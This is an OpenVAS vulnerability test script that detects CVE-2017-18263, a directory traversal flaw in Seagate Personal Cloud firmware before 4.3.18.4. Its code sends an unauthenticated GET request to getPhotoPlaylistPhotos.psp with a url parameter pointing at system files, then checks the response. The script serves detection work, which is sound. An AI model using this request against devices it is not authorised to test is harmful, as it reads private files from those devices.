###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_seagate_personalcloud_dir_trav_vuln.nasl 12175 2018-10-31 06:20:00Z ckuersteiner $
#
# Seagate Personal Cloud < 4.3.18.4 Directory Traversal Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141185");
  script_version("$Revision: 12175 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-31 07:20:00 +0100 (Wed, 31 Oct 2018) $");
  script_tag(name:"creation_date", value:"2018-06-15 10:55:15 +0700 (Fri, 15 Jun 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2017-18263");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Seagate Personal Cloud < 4.3.18.4 Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_seagate_nas_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("seagate_nas/detected");

  script_tag(name:"summary", value:"Seagate Media Server in Seagate Personal Cloud before 4.3.18.4 has directory
  traversal in getPhotoPlaylistPhotos.psp via a parameter named url.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An unauthenticated attacker download arbitrary files.");

  script_tag(name:"solution", value:"Update to firmware version 4.3.18.4 or later.");

  script_xref(name:"URL", value:"https://sumofpwn.nl/advisory/2017/seagate-media-server-path-traversal-vulnerability.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

cpe_list = make_list("cpe:/h:seagate:personal_cloud", "cpe:/h:seagate:personal_cloud_2_bay");
if (!infos = get_all_app_ports_from_list(cpe_list: cpe_list))
  exit(0);

cpe = infos['cpe'];
port = infos['port'];

if (!get_app_location(cpe:cpe, port: port, nofork:TRUE))
  exit(0);

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = '/getPhotoPlaylistPhotos.psp?url=/' + file;

  if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
